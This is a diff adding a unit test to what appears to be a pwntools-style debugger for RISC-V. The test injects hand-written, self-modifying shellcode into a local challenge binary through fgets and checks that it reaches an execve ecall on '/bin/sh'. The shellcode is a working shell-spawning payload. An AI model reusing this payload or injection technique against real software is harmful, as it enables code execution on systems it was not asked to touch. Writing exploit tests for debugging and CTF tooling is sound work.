@@ -1080,6 +1080,56 @@ class Debugger_RISCV(unittest.TestCase):
 			self.assertFalse(self.dbg.priority)
 			self.dbg.close()
 
+	#@unittest.skip
+	@timeout_decorator.timeout(QUICK)
+	def test_call(self):
+		print("\ntest_exploit [RISCV]: ", end="")
+		out = []
+		with context.local(binary="./risky-business"):
+			self.dbg = Debugger(context.binary)
+			
+			shellcode = asm("""
+			lui a5, 0x6e696
+			addi a5, a5, 559
+			sd a5, -32(sp)
+			lui a5, 0x10687
+			xor a6, a6, a6
+			addi a6, a6, 1
+			slli a6, a6, 0x1c
+			sub a5, a5, a6
+			addi a5, a5, 815
+			sd a5, -28(sp)
+			addi a5, sp, -32
+			li a2, 0
+			li a1, 0
+			mv a0, a5
+			li t1, 13   
+			li  t0, 17     
+			mul a7, t0, t1 
+			addi a3, a7, 115 - 221
+			sb a3, -260(sp)
+			addi a3, sp, -258
+			jr -2(a3)
+			""")
+
+			def extend_read(dbg):
+				size = dbg.args[1]
+				if len(shellcode) >= size:
+					log.warn(f"Your shellcode is still too long! {len(shellcode)}/{size - 1}")
+					dbg.args[1] = len(shellcode) + 1
+				return False
+			self.dbg.b("fgets", callback=extend_read)
+
+			CALL_SHELLCODE = 0x896
+			done = self.dbg.until(CALL_SHELLCODE, wait=False)
+			self.dbg.p.sendline(shellcode)
+
+			done.wait()
+			self.dbg.until(self.dbg.sp - 260, hw=True)
+			self.assertEqual(self.dbg.next_inst.mnemonic, "ecall")
+			self.assertEqual(self.dbg.read_string(self.dbg.syscall_args[0]), b"/bin/sh")
+			self.dbg.close()
+
 if __name__ == "__main__":
 	with context.quiet:
 		unittest.main()
